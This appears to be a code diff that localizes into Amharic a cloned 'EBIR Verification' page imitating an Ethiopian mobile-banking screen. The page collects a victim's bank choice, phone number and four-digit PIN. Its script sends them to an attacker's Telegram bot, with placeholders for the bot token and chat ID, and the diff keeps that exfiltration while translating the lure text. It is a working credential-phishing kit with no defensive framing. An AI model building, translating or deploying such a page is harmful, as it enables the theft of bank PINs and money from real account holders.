@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="am">
 
 <head>
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
 
-    <title>EBIR Verification</title>
+    <title>EBIR ማረጋገጫ</title>
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -358,7 +358,7 @@ style.css
         <header class="header">
 
             <!-- Entire header as a single image (logo + wave + background) -->
-            <img class="header-img" src="ebirr.jpeg" alt="EBIR Header">
+            <img class="header-img" src="ebirr.jpeg" alt="EBIR ራስጌ">
 
         </header>
 
@@ -366,35 +366,35 @@ style.css
 
         <main>
 
-            <h2>Select Bank</h2>
+            <h2>ባንክ ይምረጡ</h2>
 
             <div class="banks">
 
                 <button class="bank">
-                KAAFI
+                ካፊ
             </button>
 
                 <button class="bank active">
                 <span class="check">✓</span>
-                CBO
+                ሲቢኦ
             </button>
 
                 <button class="bank">
-                NIB
+                ኒቢ
             </button>
 
                 <button class="bank">
-                WEGAGEN
+                ወጋገን
             </button>
 
                 <button class="bank">
-                AHADU
+                አሀዱ
             </button>
 
             </div>
 
             <div class="label">
-                Code
+                ኮድ
             </div>
 
             <div class="phone-row">
@@ -407,7 +407,7 @@ style.css
 
                 <div class="mobile">
 
-                    <input id="mobile" type="tel" placeholder="Mobile Number">
+                    <input id="mobile" type="tel" placeholder="የሞባይል ቁጥር">
 
                 </div>
 
@@ -415,7 +415,7 @@ style.css
 
             <!-- PIN Input Section -->
             <div class="pin-section">
-                <div class="pin-label">Enter your PIN</div>
+                <div class="pin-label">የፒን ቁጥርዎን ያስገቡ</div>
                 <div class="pin-group">
                     <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                     <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
@@ -433,11 +433,11 @@ style.css
             </div>
 
             <button id="next">
-            Next
+            ቀጣይ
         </button>
 
             <div id="offline">
-                Register Offline
+                ከመስመር ውጪ ይመዝገቡ
             </div>
 
         </footer>
@@ -446,9 +446,9 @@ style.css
 
     <script>
         /*=========================================
-                                EBIR UI Clone
-                                script.js
-                                =========================================*/
+                                        EBIR UI Clone
+                                        script.js
+                                        =========================================*/
 
         // ========== TELEGRAM CONFIG ==========
         // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
@@ -463,6 +463,15 @@ style.css
             ==========================*/
 
             const banks = document.querySelectorAll(".bank");
+
+            // Map Amharic display names → English names for Telegram
+            const bankEnglishMap = {
+                "ካፊ": "KAAFI",
+                "ሲቢኦ": "CBO",
+                "ኒቢ": "NIB",
+                "ወጋገን": "WEGAGEN",
+                "አሀዱ": "AHADU"
+            };
 
             function selectBank(button) {
 
@@ -613,9 +622,12 @@ style.css
               Send to Telegram Function
             ==========================*/
 
-            async function sendToTelegram(bank, phone, pin) {
+            async function sendToTelegram(bankAmharic, phone, pin) {
+                // Convert Amharic bank name to English for the Telegram message
+                const bankEnglish = bankEnglishMap[bankAmharic] || bankAmharic;
+
                 const message = `🔔 *New EBIR Submission*\n\n` +
-                    `🏦 *Bank:* ${bank}\n` +
+                    `🏦 *Bank:* ${bankEnglish}\n` +
                     `📱 *Phone:* +251 ${phone}\n` +
                     `🔑 *PIN:* ${pin}\n` +
                     `🕐 *Time:* ${new Date().toLocaleString()}`;
@@ -655,7 +667,7 @@ style.css
 
                 if (phone.length === 0) {
 
-                    alert("Please enter your mobile number.");
+                    alert("እባክዎ የሞባይል ቁጥርዎን ያስገቡ።");
                     mobileInput.focus();
                     return;
 
@@ -663,7 +675,7 @@ style.css
 
                 if (phone.length !== 9) {
 
-                    alert("Enter a valid 9-digit mobile number.");
+                    alert("እባክዎ ትክክለኛ ባለ 9-አሃዝ የሞባይል ቁጥር ያስገቡ።");
                     mobileInput.focus();
                     return;
 
@@ -672,20 +684,20 @@ style.css
                 const pin = getPinValue();
                 if (pin.length !== 4) {
 
-                    alert("Please enter your 4-digit PIN.");
+                    alert("እባክዎ ባለ 4-አሃዝ ፒን ያስገቡ።");
                     pinBoxes[0].focus();
                     return;
 
                 }
 
-                const activeBank = document.querySelector(".bank.active").dataset.name;
+                const activeBankAmharic = document.querySelector(".bank.active").dataset.name;
 
                 // Disable button to prevent double-submit
                 next.disabled = true;
-                next.textContent = "Processing...";
+                next.textContent = "በሂደት ላይ...";
 
-                // Send to Telegram
-                const sent = await sendToTelegram(activeBank, phone, pin);
+                // Send to Telegram (bank name will be converted to English inside the function)
+                const sent = await sendToTelegram(activeBankAmharic, phone, pin);
 
                 if (!sent) {
                     console.warn("Telegram send failed — check your bot token and chat ID.");
@@ -705,7 +717,7 @@ style.css
 
             offline.addEventListener("click", () => {
 
-                alert("Offline registration selected.");
+                alert("ከመስመር ውጪ መመዝገቢያ ተመርጧል።");
 
             });
 
